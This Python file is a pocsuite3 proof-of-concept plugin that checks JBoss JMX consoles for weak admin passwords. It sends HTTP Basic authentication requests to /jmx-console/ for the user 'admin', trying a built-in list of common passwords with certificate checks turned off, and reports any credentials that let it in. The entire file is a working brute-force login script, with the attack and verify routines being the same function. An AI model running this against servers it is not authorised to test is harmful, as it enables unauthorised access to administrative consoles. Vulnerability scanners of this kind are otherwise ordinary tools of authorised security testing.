#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url
import base64


class TestPOC(POCBase):
	vulID = ''''''
	cveID = ''''''
	cnvdID = ''''''
	cnnvdID = ''''''
	version = ''''''
	author = ''''''
	vulDate = ''''''
	createDate = ''''''
	updateDate = ''''''
	name = '''Jboss管理后台弱口令'''
	desc = ''''''
	solution = ''''''
	severity = '''high'''
	vulType = '''weak-pass'''
	references = ['''''']
	appName = '''Jboss'''
	appVersion = '''all'''
	appPowerLink = ''''''
	samples = ['''''']
	install_requires = ['''''']

	def _verify(self):
		self.url, ip, port = parse_ip_port(self.target, 8080)
		result = {}
		payload = '/jmx-console/'
		payload_url = make_verify_url(self.url, payload, mod=0)
		pwd_list = ['123456', 'admin', 'admin8', 'admin123', 'password', '111111', '12345678', 'admin9', 'admin2']

		for passwd in pwd_list:
			user = 'admin'
			basse64_str = b'Basic ' + base64.b64encode((user+":"+passwd).encode())
			headers = {"Authorization": basse64_str}
			resp = requests.get(payload_url,headers=headers, verify=False, timeout=15)
			if (b'JBoss JMX Management Console' in resp.content or b'JBoss Application Server.' in resp.content) and resp.status_code == 200:
				result['VerifyInfo'] = {}
				result['VerifyInfo']['URL'] = payload_url
				result['VerifyInfo']['Username'] = user
				result['VerifyInfo']['Password'] = passwd
		return self.parse_output(result)

	_attack = _verify

	def parse_output(self, result):
		#parse output
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Failed')
		return output


register_poc(TestPOC)
